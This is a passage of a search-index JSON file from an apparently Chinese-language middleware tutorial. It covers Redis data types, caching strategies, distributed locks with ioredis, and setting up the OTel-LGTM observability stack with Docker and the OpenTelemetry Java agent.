HGETALL\uff1a\u83b7\u53d6\u54c8\u5e0c\u8868\u6240\u6709\u5b57\u6bb5\u548c\u503c\u3002 HDEL\uff1a\u5220\u9664\u54c8\u5e0c\u8868\u4e2d\u7684\u5b57\u6bb5\u3002 HSET user:1000 name \"Alice\" age 25 HGET user:1000 name HGETALL user:1000 HDEL user:1000 age \u6ce8\u610f\uff0chash \u7c7b\u578b\u7684\u503c\u4e0d\u80fd\u662f hash \u7c7b\u578b\u3002\u5373\u4e0d\u80fd\u5d4c\u5957 hash\u3002\u4f46\u5176\u5b83\u6570\u636e\u7c7b\u578b\u662f\u53ef\u4ee5\u7684\u3002 \u8fd9\u91cc\u7528 user:1000 \u662f\u4f5c\u4e3a hash \u8868\u7684\u540d\u79f0\u3002\u56e0\u4e3a\u4e0d\u652f\u6301\u5d4c\u5957 hash\uff0c\u4e00\u79cd\u5e38\u89c1\u7684 trick \u662f\u4f7f\u7528\u5192\u53f7\u5206\u5272\u7d22\u5f15\u3002\u4f8b\u5982\u8fd9\u91cc user:1000 \u53ef\u4ee5\u8ba4\u4e3a\u662f ID \u4e3a 1000 \u7684\u7528\u6237\u3002\u6ce8\u610f\uff0c\u8fd9\u4e0d\u662f\u6807\u51c6\uff0c\u5177\u4f53\u4f7f\u7528\u54ea\u4e2a\u5b57\u7b26\u5206\u5272\u8bf7\u53c2\u7167\u5f00\u53d1\u89c4\u8303\u3002","title":"\u54c8\u5e0c\uff08Hash\uff09"},{"location":"28/#list","text":"Redis \u7684\u5217\u8868\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u94fe\u8868\u6570\u636e\u7ed3\u6784\u3002\u4f60\u53ef\u4ee5\u5728\u5217\u8868\u7684\u4e24\u7aef\u8fdb\u884c\u63d2\u5165\u3001\u5220\u9664\u7b49\u64cd\u4f5c\uff0c\u975e\u5e38\u9002\u5408\u5b9e\u73b0\u6d88\u606f\u961f\u5217\u3002 LPUSH\uff1a\u5c06\u4e00\u4e2a\u6216\u591a\u4e2a\u5143\u7d20\u63d2\u5165\u5230\u5217\u8868\u7684\u5de6\u8fb9\u3002 RPUSH\uff1a\u5c06\u4e00\u4e2a\u6216\u591a\u4e2a\u5143\u7d20\u63d2\u5165\u5230\u5217\u8868\u7684\u53f3\u8fb9\u3002 LPOP\uff1a\u4ece\u5217\u8868\u7684\u5de6\u8fb9\u5f39\u51fa\u4e00\u4e2a\u5143\u7d20\u3002 RPOP\uff1a\u4ece\u5217\u8868\u7684\u53f3\u8fb9\u5f39\u51fa\u4e00\u4e2a\u5143\u7d20\u3002 LRANGE\uff1a\u83b7\u53d6\u5217\u8868\u4e2d\u7684\u4e00\u4e2a\u8303\u56f4\u3002 RPUSH mylist \"apple\" \"banana\" \"cherry\" LPOP mylist LRANGE mylist 0 -1 \u8d1f\u7d22\u5f15\u548c python \u4e2d\u8d1f\u7d22\u5f15\u884c\u4e3a\u4e00\u81f4\u3002","title":"\u5217\u8868\uff08List\uff09"},{"location":"28/#set","text":"Redis \u96c6\u5408\u662f\u4e00\u4e2a\u65e0\u5e8f\u7684\u5b57\u7b26\u4e32\u96c6\u5408\uff0c\u96c6\u5408\u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f\u552f\u4e00\u7684\u3002\u96c6\u5408\u652f\u6301\u5e38\u89c1\u7684\u96c6\u5408\u64cd\u4f5c\uff0c\u5982\u5e76\u96c6\u3001\u4ea4\u96c6\u548c\u5dee\u96c6\u7b49\u3002 SADD\uff1a\u5411\u96c6\u5408\u6dfb\u52a0\u4e00\u4e2a\u6216\u591a\u4e2a\u5143\u7d20\u3002 SMEMBERS\uff1a\u8fd4\u56de\u96c6\u5408\u4e2d\u7684\u6240\u6709\u6210\u5458\u3002 SISMEMBER\uff1a\u68c0\u67e5\u5143\u7d20\u662f\u5426\u662f\u96c6\u5408\u7684\u6210\u5458\u3002 SPOP\uff1a\u968f\u673a\u5f39\u51fa\u96c6\u5408\u4e2d\u7684\u4e00\u4e2a\u5143\u7d20\u3002 SADD fruits \"apple\" \"banana\" \"cherry\" SMEMBERS fruits SISMEMBER fruits \"banana\" SPOP fruits","title":"\u96c6\u5408\uff08Set\uff09"},{"location":"28/#zset","text":"\u6709\u5e8f\u96c6\u5408\u662f\u4e00\u4e2a\u5305\u542b\u552f\u4e00\u5143\u7d20\u7684\u96c6\u5408\uff0c\u6bcf\u4e2a\u5143\u7d20\u90fd\u6709\u4e00\u4e2a\u5206\u6570\uff08score\uff09\u3002\u6839\u636e\u5206\u6570\u7684\u5927\u5c0f\u6765\u4e3a\u5143\u7d20\u6392\u5e8f\u3002\u5b83\u9002\u7528\u4e8e\u6392\u884c\u699c\u3001\u6d88\u606f\u961f\u5217\u7b49\u573a\u666f\u3002 ZADD\uff1a\u5411\u6709\u5e8f\u96c6\u5408\u6dfb\u52a0\u4e00\u4e2a\u6216\u591a\u4e2a\u5143\u7d20\u3002 ZRANGE\uff1a\u8fd4\u56de\u6709\u5e8f\u96c6\u5408\u6307\u5b9a\u533a\u95f4\u7684\u6210\u5458\u3002 ZREM\uff1a\u4ece\u6709\u5e8f\u96c6\u5408\u4e2d\u79fb\u9664\u4e00\u4e2a\u6216\u591a\u4e2a\u6210\u5458\u3002 ZINCRBY\uff1a\u589e\u52a0\u6709\u5e8f\u96c6\u5408\u6210\u5458\u7684\u5206\u6570\u3002 ZADD leaderboard 100 \"Alice\" 150 \"Bob\" ZRANGE leaderboard 0 -1 # \u83b7\u53d6\u6240\u6709\u6210\u5458 ZINCRBY leaderboard 10 \"Alice\" # \u66f4\u65b0\u5206\u6570 ZREM leaderboard \"Bob\" # \u79fb\u9664\u67d0\u4e2a\u6210\u5458","title":"\u6709\u5e8f\u96c6\u5408\uff08ZSet\uff09"},{"location":"28/#redis_2","text":"\u524d\u9762\u6211\u4eec\u8bb2\u547d\u4ee4\u65f6\uff0c\u6ca1\u6709\u8bb2\u547d\u4ee4\u7684\u8fd4\u56de\u503c\uff0c\u56e0\u4e3a\u8fd9\u662f\u8bed\u8a00\u6709\u5173\u7684\u3002\u800c\u5bf9\u4e8e\u547d\u4ee4\u884c\u91cc\uff0c\u8fd4\u56de\u503c\u662f\u76f4\u63a5\u5c55\u793a\u51fa\u6765\u7684\u3002 Redis \u4f5c\u4e3a\u7f13\u5b58\u7684\u601d\u60f3\u5f88\u7b80\u5355\uff0c\u5373\u5728\u4ece\u6570\u636e\u5e93\u53d6\u503c\u524d\u5148\u4ece Redis \u53d6 (cache aside)\u3002\u8fd9\u91cc\u9700\u8981\u8003\u8651\u7684\u95ee\u9898\u6709\uff0c\u7f13\u5b58\u6dd8\u6c70\uff0c\u5199\u4e00\u81f4\u6027\uff0c\u96ea\u5d29\u98ce\u9669\uff0c\u7f13\u5b58\u7a7f\u900f\u3002\u7f13\u5b58\u5c42\u901a\u5e38\u90e8\u7f72\u5728\u5e94\u7528\u548c\u6570\u636e\u5e93\u4e4b\u95f4\uff0c\u51cf\u5c11\u6570\u636e\u5e93\u7684\u8bbf\u95ee\u538b\u529b\uff0c\u63d0\u9ad8\u54cd\u5e94\u901f\u5ea6\u3002","title":"Redis \u4f5c\u4e3a\u7f13\u5b58"},{"location":"28/#_1","text":"Redis \u4f1a\u5728\u81ea\u5df1\u9700\u8981\u7684\u5185\u5b58\u8d85\u8fc7\u8bbe\u7f6e\u7684\u5bb9\u91cf\u4e0a\u7ebf\u540e\u81ea\u52a8\u6dd8\u6c70\u6570\u636e\uff0c\u53ef\u4ee5\u9009\u62e9\u4ee5\u4e0b\u7b56\u7565\uff0c LRU\uff08Least Recently Used\uff09\uff1a\u5220\u9664\u6700\u4e45\u672a\u88ab\u8bbf\u95ee\u7684\u952e\u3002 LFU\uff08Least Frequently Used\uff09\uff1a\u5220\u9664\u4f7f\u7528\u9891\u7387\u6700\u4f4e\u7684\u952e\u3002 TTL\uff08Time to Live\uff09\uff1a\u8bbe\u7f6e\u6bcf\u4e2a\u7f13\u5b58\u9879\u7684\u8fc7\u671f\u65f6\u95f4\uff0c\u8d85\u65f6\u81ea\u52a8\u5220\u9664\u3002 \u968f\u673a\u6dd8\u6c70\uff1a\u968f\u673a\u9009\u62e9\u4e00\u4e2a\u952e\u5220\u9664\u3002 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5207\u6362\uff0c maxmemory-policy volatile-lru \u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u624b\u52a8\u8bbe\u5b9a\u8fc7\u671f\u65f6\u95f4\uff0c\u4f7f\u7528 EXPIRE \u547d\u4ee4\u6765\u4e3a\u5df2\u6709\u7684\u952e\u8bbe\u7f6e\u8fc7\u671f\u65f6\u95f4\uff0c\u5355\u4f4d\u662f\u79d2\u3002 EXPIRE mykey 3600 # \u8bbe\u7f6e mykey \u952e\u5728 3600 \u79d2\uff081\u5c0f\u65f6\uff09\u540e\u8fc7\u671f \u5982\u679c\u4f60\u5728\u8bbe\u7f6e\u952e\u65f6\u540c\u65f6\u6307\u5b9a\u8fc7\u671f\u65f6\u95f4\uff0c\u53ef\u4ee5\u4f7f\u7528 SET \u547d\u4ee4\u7684 EX\uff08\u8fc7\u671f\u65f6\u95f4\uff0c\u5355\u4f4d\uff1a\u79d2\uff09\u6216 PX\uff08\u8fc7\u671f\u65f6\u95f4\uff0c\u5355\u4f4d\uff1a\u6beb\u79d2\uff09\u9009\u9879\uff1a SET mykey \"value\" EX 3600 # \u8bbe\u7f6e mykey \u952e\u5728 3600 \u79d2\u540e\u8fc7\u671f SET mykey \"value\" PX 1800000 # \u8bbe\u7f6e mykey \u952e\u5728 30 \u5206\u949f\u540e\u8fc7\u671f \u4f7f\u7528 TTL \u547d\u4ee4\u53ef\u4ee5\u67e5\u770b\u6307\u5b9a\u952e\u7684\u5269\u4f59\u751f\u5b58\u65f6\u95f4\u3002\u5982\u679c\u952e\u5df2\u8fc7\u671f\uff0cTTL \u4f1a\u8fd4\u56de -2\uff1b\u5982\u679c\u952e\u6ca1\u6709\u8bbe\u7f6e\u8fc7\u671f\u65f6\u95f4\uff0cTTL \u4f1a\u8fd4\u56de -1\u3002 TTL mykey # \u8fd4\u56de mykey \u7684\u5269\u4f59\u751f\u5b58\u65f6\u95f4 \u5982\u679c\u4f60\u60f3\u53d6\u6d88\u5df2\u8bbe\u7f6e\u7684\u8fc7\u671f\u65f6\u95f4\uff0c\u8ba9\u952e\u53d8\u6210\u6c38\u4e45\u5b58\u5728\uff0c\u53ef\u4ee5\u4f7f\u7528 PERSIST \u547d\u4ee4\uff1a PERSIST mykey # \u53d6\u6d88 mykey \u7684\u8fc7\u671f\u65f6\u95f4","title":"\u7f13\u5b58\u6dd8\u6c70\u7b56\u7565"},{"location":"28/#_2","text":"\u53ea\u8bfb\u573a\u666f\u7b56\u7565\u5f88\u7b80\u5355\uff0c\u4f46\u662f\u6d89\u53ca\u5230\u5199\u65f6\uff0c\u6211\u4eec\u7684\u7f13\u5b58\u7b56\u7565\u9700\u8981\u66f4\u590d\u6742\u4e00\u4e9b\uff0c\u5e38\u7528\u7684\u6280\u672f\u6709\u4ee5\u4e0b\u51e0\u79cd\uff0c Cache Aside\uff08\u65c1\u8def\u7f13\u5b58\uff09 \u8fd9\u79cd\u6a21\u5f0f\u901a\u5e38\u5e94\u7528\u4e8e\u6570\u636e\u5e93\u67e5\u8be2\u7684\u573a\u666f\u3002\u5e94\u7528\u5728\u67e5\u8be2\u65f6\u5148\u5c1d\u8bd5\u4ece\u7f13\u5b58\u4e2d\u83b7\u53d6\u6570\u636e\uff0c\u5982\u679c\u7f13\u5b58\u4e2d\u6ca1\u6709\u518d\u4ece\u6570\u636e\u5e93\u4e2d\u83b7\u53d6\uff0c\u5e76\u5c06\u6570\u636e\u5e93\u67e5\u8be2\u7ed3\u679c\u653e\u5165\u7f13\u5b58\u3002\u5f53\u7f13\u5b58\u4e2d\u7684\u6570\u636e\u8fc7\u671f\u6216\u88ab\u6e05\u9664\u65f6\uff0c\u4e0b\u4e00\u6b21\u67e5\u8be2\u4f1a\u91cd\u65b0\u4ece\u6570\u636e\u5e93\u83b7\u53d6\u5e76\u66f4\u65b0\u7f13\u5b58\u3002 Read Through\uff08\u8bfb\u7a7f\u900f\uff09 \u5728\u8fd9\u4e2a\u6a21\u5f0f\u4e2d\uff0c\u5e94\u7528\u4e0d\u9700\u8981\u663e\u5f0f\u67e5\u8be2\u6570\u636e\u5e93\u3002\u5982\u679c\u7f13\u5b58\u4e2d\u6ca1\u6709\u6570\u636e\uff0c\u7f13\u5b58\u4f1a\u81ea\u52a8\u4ece\u6570\u636e\u5e93\u52a0\u8f7d\u6570\u636e\u5e76\u7f13\u5b58\u8d77\u6765\u3002\u7f13\u5b58\u8d1f\u8d23\u4ece\u6570\u636e\u5e93\u52a0\u8f7d\u6570\u636e\uff0c\u7c7b\u4f3c\u4e8e\u7f13\u5b58\u548c\u6570\u636e\u5e93\u4e4b\u95f4\u7684\u4ee3\u7406\u3002 Write Through\uff08\u5199\u7a7f\u900f\uff09 \u5199\u5165\u6570\u636e\u65f6\uff0c\u9996\u5148\u4f1a\u5199\u5165\u7f13\u5b58\uff0c\u7136\u540e\u518d\u5199\u5165\u6570\u636e\u5e93\uff0c\u786e\u4fdd\u7f13\u5b58\u548c\u6570\u636e\u5e93\u7684\u6570\u636e\u4e00\u81f4\u3002\u8fd9\u79cd\u6a21\u5f0f\u9002\u7528\u4e8e\u6570\u636e\u66f4\u65b0\u9891\u7e41\u4e14\u9700\u8981\u4fdd\u6301\u7f13\u5b58\u548c\u6570\u636e\u5e93\u4e00\u81f4\u6027\u7684\u573a\u666f\u3002 Write Behind\uff08\u5199\u540e\u8bfb\uff09 \u6570\u636e\u9996\u5148\u5199\u5165\u7f13\u5b58\uff0c\u7136\u540e\u7531\u4e00\u4e2a\u5f02\u6b65\u7684\u8fc7\u7a0b\u66f4\u65b0\u6570\u636e\u5e93\u3002\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u6570\u636e\u5e93\u7684\u5199\u5165\u538b\u529b\uff0c\u9002\u7528\u4e8e\u4e00\u4e9b\u5bf9\u6570\u636e\u4e00\u81f4\u6027\u8981\u6c42\u4e0d\u9ad8\u7684\u573a\u666f\u3002","title":"\u7f13\u5b58\u4e00\u81f4\u6027\u95ee\u9898"},{"location":"28/#_3","text":"\u7f13\u5b58\u96ea\u5d29\u662f\u6307\u7f13\u5b58\u4e2d\u7684\u5927\u91cf\u6570\u636e\u5931\u6548\uff0c\u5bfc\u81f4\u5927\u91cf\u8bf7\u6c42\u76f4\u63a5\u8bbf\u95ee\u6570\u636e\u5e93\uff0c\u7ed9\u6570\u636e\u5e93\u5e26\u6765\u5de8\u5927\u538b\u529b\uff0c\u4ece\u800c\u5bfc\u81f4\u6570\u636e\u5e93\u5b95\u673a\u3002\u4e3a\u4e86\u907f\u514d\u7f13\u5b58\u96ea\u5d29\uff0c\u53ef\u4ee5\u91c7\u53d6\u4ee5\u4e0b\u7b56\u7565\uff1a \u5408\u7406\u8bbe\u7f6e\u7f13\u5b58\u8fc7\u671f\u65f6\u95f4\uff1a\u4e0d\u540c\u7684\u6570\u636e\u8bbe\u7f6e\u4e0d\u540c\u7684\u8fc7\u671f\u65f6\u95f4\uff0c\u907f\u514d\u540c\u4e00\u65f6\u95f4\u70b9\u5927\u91cf\u7f13\u5b58\u5931\u6548\u3002 \u7f13\u5b58\u9884\u70ed\uff1a\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\uff0c\u53ef\u4ee5\u9884\u5148\u52a0\u8f7d\u4e00\u4e9b\u5e38\u7528\u7684\u6570\u636e\u5230\u7f13\u5b58\u4e2d\uff0c\u907f\u514d\u9996\u6b21\u8bf7\u6c42\u65f6\u5927\u91cf\u67e5\u8be2\u6570\u636e\u5e93\u3002 \u4f7f\u7528\u591a\u7ea7\u7f13\u5b58\uff1a\u5728 Redis \u4e4b\u5916\u4f7f\u7528\u5176\u4ed6\u7f13\u5b58\u673a\u5236\uff08\u5982\u672c\u5730\u7f13\u5b58\uff09\uff0c\u907f\u514d\u5b8c\u5168\u4f9d\u8d56 Redis\u3002 \u4f7f\u7528\u4e92\u65a5\u9501\uff1a\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7\u5206\u5e03\u5f0f\u9501\u673a\u5236\uff0c\u786e\u4fdd\u5728\u7f13\u5b58\u5931\u6548\u65f6\u53ea\u4f1a\u6709\u4e00\u4e2a\u8bf7\u6c42\u53bb\u52a0\u8f7d\u6570\u636e\uff0c\u9632\u6b62\u540c\u4e00\u4e2a\u6570\u636e\u88ab\u591a\u6b21\u52a0\u8f7d\u3002","title":"\u96ea\u5d29\u98ce\u9669"},{"location":"28/#_4","text":"\u7f13\u5b58\u7a7f\u900f\u6307\u7684\u662f\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u6570\u636e\u65e2\u4e0d\u5728\u7f13\u5b58\u4e2d\uff0c\u4e5f\u4e0d\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u5bfc\u81f4\u6bcf\u6b21\u8bf7\u6c42\u90fd\u76f4\u63a5\u67e5\u8be2\u6570\u636e\u5e93\u3002\u4e3a\u4e86\u907f\u514d\u7f13\u5b58\u7a7f\u900f\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u65b9\u6cd5\uff1a \u7f13\u5b58\u7a7a\u503c\uff1a\u5f53\u67d0\u4e2a\u6570\u636e\u67e5\u8be2\u8fd4\u56de\u4e3a\u7a7a\u65f6\uff0c\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u7a7a\u503c\u7f13\u5b58\u4e00\u6bb5\u65f6\u95f4\uff0c\u907f\u514d\u91cd\u590d\u67e5\u8be2\u6570\u636e\u5e93\u3002 \u53c2\u6570\u6821\u9a8c\uff1a\u5728\u67e5\u8be2\u6570\u636e\u4e4b\u524d\uff0c\u5148\u8fdb\u884c\u53c2\u6570\u6821\u9a8c\uff0c\u907f\u514d\u65e0\u6548\u8bf7\u6c42\u89e6\u53d1\u6570\u636e\u5e93\u67e5\u8be2\u3002 Bloom Filter\uff1a\u4f7f\u7528\u5e03\u9686\u8fc7\u6ee4\u5668\u5728\u7f13\u5b58\u4e2d\u9884\u5148\u5224\u65ad\u8bf7\u6c42\u7684\u6570\u636e\u662f\u5426\u5b58\u5728\uff0c\u9632\u6b62\u65e0\u6548\u6570\u636e\u8bbf\u95ee\u6570\u636e\u5e93(\u5e03\u9686\u8fc7\u6ee4\u5668\u662f\u4e00\u79cd\u7a7a\u95f4\u6548\u7387\u9ad8\u7684\u6982\u7387\u578b\u6570\u636e\u7ed3\u6784\uff0c\u7528\u4e8e\u6d4b\u8bd5\u67d0\u4e2a\u5143\u7d20\u662f\u5426\u5728\u4e00\u4e2a\u96c6\u5408\u4e2d\u3002\u5b83\u7684\u7279\u70b9\u662f\u67e5\u8be2\u64cd\u4f5c\u975e\u5e38\u5feb\u901f\uff0c\u800c\u4e14\u5185\u5b58\u6d88\u8017\u6781\u4f4e\uff0c\u4f46\u5b83\u53ef\u80fd\u4f1a\u4ea7\u751f\u5047\u9633\u6027\uff0c\u5373\u9519\u8bef\u5730\u8ba4\u4e3a\u67d0\u4e2a\u5143\u7d20\u5b58\u5728\uff0c\u4f46\u7edd\u5bf9\u4e0d\u4f1a\u8bef\u5224\u67d0\u4e2a\u5143\u7d20\u4e0d\u5b58\u5728)\u3002","title":"\u7f13\u5b58\u7a7f\u900f"},{"location":"28/#redis_3","text":"Redis \u4f5c\u4e3a\u5206\u5e03\u5f0f\u9501\u65f6\uff0c\u53ef\u4ee5\u5229\u7528 Redis \u7684 SET \u547d\u4ee4\u7ed3\u5408\u8fc7\u671f\u65f6\u95f4\u6765\u5b9e\u73b0\u3002\u901a\u8fc7\u8bbe\u7f6e\u4e00\u4e2a\u552f\u4e00\u7684\u9501\u6807\u8bc6\uff08\u901a\u5e38\u662f\u4e00\u4e2a\u968f\u673a\u503c\uff09\uff0c\u5e76\u8bbe\u7f6e\u4e00\u4e2a\u8fc7\u671f\u65f6\u95f4\uff08\u9632\u6b62\u6b7b\u9501\uff09\uff0c\u6765\u786e\u4fdd\u5728\u540c\u4e00\u65f6\u95f4\u53ea\u6709\u4e00\u4e2a\u8fdb\u7a0b\u80fd\u83b7\u5f97\u9501\u3002 \u6211\u4eec\u9700\u8981\u8fd9\u4e9b\u547d\u4ee4\u3002 SETNX\uff1a\u8fd9\u662f Redis \u4e2d\u7684\u4e00\u79cd\u547d\u4ee4\uff0c\u5b83\u53ea\u6709\u5728\u952e\u4e0d\u5b58\u5728\u65f6\u624d\u4f1a\u8bbe\u7f6e\u503c\u3002\u53ef\u4ee5\u7528\u6765\u5b9e\u73b0\u9501\u7684\u83b7\u53d6\u3002 EXPIRE\uff1a\u8bbe\u7f6e\u4e00\u4e2a\u8fc7\u671f\u65f6\u95f4\uff0c\u9632\u6b62\u9501\u56e0\u4e3a\u8fdb\u7a0b\u5d29\u6e83\u7b49\u95ee\u9898\u5bfc\u81f4\u6b7b\u9501\u3002 GET\uff1a\u68c0\u67e5\u5f53\u524d\u9501\u662f\u5426\u5b58\u5728\u3002 \u5047\u8bbe\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u7b80\u5355\u7684\u5206\u5e03\u5f0f\u9501\uff0c\u4ee5\u4e0b\u662f\u4f7f\u7528 Node.js \u548c ioredis \u5e93\u5b9e\u73b0\u7684\u5206\u5e03\u5f0f\u9501\u793a\u4f8b\uff1a const Redis = require('ioredis'); const redis = new Redis({ host: 'localhost', // Redis\u670d\u52a1\u5668\u5730\u5740 port: 6379, // Redis\u7aef\u53e3 }); // \u9501\u7684 key \u548c\u8fc7\u671f\u65f6\u95f4 const LOCK_KEY = 'myLock'; const LOCK_TIMEOUT = 10; // 10\u79d2\u8fc7\u671f\u65f6\u95f4 // \u83b7\u53d6\u5206\u5e03\u5f0f\u9501 async function acquireLock() { const lockValue = Math.random().toString(36).substr(2); // \u751f\u6210\u552f\u4e00\u7684\u9501\u6807\u8bc6 const result = await redis.set(LOCK_KEY, lockValue, 'NX', 'EX', LOCK_TIMEOUT); if (result === 'OK') { console.log('Lock acquired successfully'); return lockValue; } else { console.log('Failed to acquire lock'); await new Promise(resolve => setTimeout(resolve, 500)); return acquireLock(); } } // \u91ca\u653e\u5206\u5e03\u5f0f\u9501 async function releaseLock(lockValue) { const currentValue = await redis.get(LOCK_KEY); // \u53ea\u6709\u5f53\u5f53\u524d\u9501\u7684\u503c\u4e0e\u4f20\u5165\u7684 lockValue \u4e00\u81f4\u65f6\u624d\u80fd\u91ca\u653e if (currentValue === lockValue) { await redis.del(LOCK_KEY); console.log('Lock released successfully'); } else { console.log('Failed to release lock: Lock value mismatch'); } } // \u6a21\u62df\u4efb\u52a1\u6267\u884c async function performTask() { const lockValue = await acquireLock(); if (lockValue) { try { // \u6267\u884c\u4efb\u52a1 console.log('Task is being executed...'); await new Promise(resolve => setTimeout(resolve, 1000)); // \u6a21\u62df\u4efb\u52a1\u6267\u884c\u65f6\u95f4 } finally { await releaseLock(lockValue); } } else { console.log('Cannot perform task, lock acquisition failed'); } } // \u6267\u884c\u4efb\u52a1 for(let i = 0; i < 10; i++) { performTask(); } Redis \u4f1a\u786e\u4fdd\u53ea\u6709\u4e00\u4e2a\u4efb\u52a1\u80fd\u6210\u529f\u83b7\u5f97\u9501\u5e76\u6267\u884c\uff0c\u5176\u4ed6\u4efb\u52a1\u4f1a\u5c1d\u8bd5\u91cd\u65b0\u83b7\u53d6\u9501\uff0c\u76f4\u5230\u9501\u88ab\u91ca\u653e\u3002 \u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u786e\u4fdd\u5728\u5206\u5e03\u5f0f\u73af\u5883\u4e2d\u53ea\u6709\u4e00\u4e2a\u8fdb\u7a0b\u6267\u884c\u67d0\u4e2a\u5173\u952e\u4efb\u52a1\uff0c\u9002\u7528\u4e8e\u9650\u6d41\u3001\u4efb\u52a1\u8c03\u5ea6\u7b49\u573a\u666f\u3002","title":"Redis \u4f5c\u4e3a\u5206\u5e03\u5f0f\u9501"},{"location":"29/","text":"\u4e2d\u95f4\u4ef6\u901f\u6210 Ch29 OTel-LGTM OTel-LGTM \u662f\u6307\u7684\u4e00\u7ec4\u5de5\u5177\u548c\u5e93\uff0c\u4e3b\u8981\u7528\u4e8e\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u8fdb\u884c\u8ddf\u8e2a\uff08Tracing\uff09\u3001\u65e5\u5fd7\uff08Logging\uff09\u3001\u5ea6\u91cf\uff08Metrics\uff09\u7b49\u65b9\u9762\u7684 observability\uff08\u53ef\u89c2\u5bdf\u6027\uff09\u5de5\u4f5c\u3002\u5b83\u662f OpenTelemetry\uff08OTel\uff09\u7684\u6269\u5c55\u548c\u5b9e\u73b0\uff0c\u76ee\u7684\u662f\u8ba9\u5f00\u53d1\u8005\u80fd\u591f\u4ee5\u66f4\u7b80\u5355\u3001\u96c6\u4e2d\u7684\u65b9\u5f0f\u76d1\u63a7\u548c\u8c03\u8bd5\u4ed6\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u3002 OTelemetry \u8d1f\u8d23\u6536\u96c6\u6570\u636e\uff0cL \u662f\u6307 Loki \u65e5\u5fd7\u6570\u636e\u5e93\uff0cG \u6307 Grafana \u53ef\u89c6\u5316\u5de5\u5177\uff0cT \u6307 Tempo \u94fe\u8def\u6570\u636e\u5e93\uff0cM \u6307 Prometheus Metric \u5ea6\u91cf\u6570\u636e\u5e93\u3002 \u8fd9\u4e9b\u5de5\u5177\u901a\u5e38\u7ec4\u5408\u5728\u4e00\u8d77\u4f7f\u7528\uff0c\u652f\u6301\u5b9e\u65f6\u6536\u96c6\u6570\u636e\u5e76\u76d1\u63a7\u3002 \u8fd9\u4e9b\u91cc\u9762\u5176\u5b9e\u6211\u4eec\u524d\u9762\u7528\u8fc7\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u624b\u52a8\u914d\u3002\u4f8b\u5982 istio \u7f51\u683c\u91cc\u6709 Grafana \u4e0e Prometheus\uff0cNacOS \u4e5f\u4f7f\u7528\u4e86\u3002 \u542f\u52a8 \u76f4\u63a5\u4f7f\u7528 docker \u955c\u50cf\u5373\u53ef\uff0c\u6240\u6709\u5de5\u5177\u5747\u5df2\u6253\u5305\u597d\uff0c\u5b98\u65b9\u5728 github \u9875\u9762\u4e5f\u63d0\u4f9b\u4e86 k8s \u7248\u672c\u3002 version: '3' services: grafana-otel-lgtm: image: grafana/otel-lgtm ports: - \"3000:3000\" - \"4317:4317\" - \"4318:4318\" stdin_open: true tty: true \u8981\u542f\u52a8\u7684\u5185\u5bb9\u6bd4\u8f83\u591a\uff0c\u56e0\u6b64\u542f\u52a8\u65f6\u95f4\u6709\u70b9\u957f\u3002 \u96c6\u6210 \u8fd9\u4e2a\u6808\u76ee\u524d\u5bf9 Java \u652f\u6301\u8f83\u597d\uff0c\u4e0d\u8fc7\u5176\u5b83\u8bed\u8a00\u4e5f\u6709\u652f\u6301\u3002\u8fd9\u91cc\u7528 Spring \u6f14\u793a\u3002 \u8d77\u4e2a\u7b80\u5355\u7684 Spring \u7a0b\u5e8f\uff0c\u7528\u4e0b\u9762\u7684 Controller\u3002 package org.example; import java.util.Optional; import java.util.concurrent.ThreadLocalRandom; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.RestController; @RestController public class RollController { private static final Logger logger = LoggerFactory.getLogger(RollController.class); @GetMapping(\"/rolldice\") public String index(@RequestParam(\"player\") Optional<String> player) { int result = this.getRandomNumber(1, 6); if (player.isPresent()) { logger.info(\"{} is rolling the dice: {}\", player.get(), result); } else { logger.info(\"Anonymous player is rolling the dice: {}\", result); } return Integer.toString(result); } public int getRandomNumber(int min, int max) { return ThreadLocalRandom.current().nextInt(min, max + 1); } } \u786e\u4fdd\u80fd\u8fd0\u884c\u540e\uff0c\u6253\u5305\u6210 jar \u5305\u3002 gradle assemble java -jar ./build/libs/app.jar \u4e0b\u8f7d Java Agent\uff0c\u76f8\u5f53\u4e8e\u662f\u4e00\u4e2a\u4ee3\u7406\uff0c curl -L -O https://github.com/open-telemetry/opentelemetry-java-instrumentation/releases/latest/download/opentelemetry-javaagent.jar Java \u81ea\u5e26\u4ee3\u7406\u529f\u80fd\uff0c\u76f4\u63a5\u8fd0\u884c\u5373\u53ef\uff0c java -jar -javaagent:opentelemetry-javaagent.jar ./build/libs/app.jar \u73b0\u5728\u6267\u884c\u540e\uff0clogging \u4f1a\u88ab\u53d1\u9001\u5230 Open Telemetry\uff0c\u7136\u540e\u5b58\u5165\u6570\u636e\u5e93\uff0c\u6700\u540e\u53ef\u4ee5\u5728 Grafana \u7684\u754c\u9762\u4e2d\u770b\u5230\u3002 \u4e4b\u540e\u7684\u64cd\u4f5c\u90fd\u662f\u56fe\u5f62\u5316\u7684\uff0c\u53c2\u8003\u6587\u6863\u5373\u53ef\uff0c\u6b64\u5904\u7701\u7565\u3002","title":"OTel-LGTM"},{"location":"29/#ch29-otel-lgtm","text":"OTel-LGTM \u662f\u6307\u7684\u4e00\u7ec4\u5de5\u5177\u548c\u5e93\uff0c\u4e3b\u8981\u7528\u4e8e\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u8fdb\u884c\u8ddf\u8e2a\uff08Tracing\uff09\u3001\u65e5\u5fd7\uff08Logging\uff09\u3001\u5ea6\u91cf\uff08Metrics\uff09\u7b49\u65b9\u9762\u7684 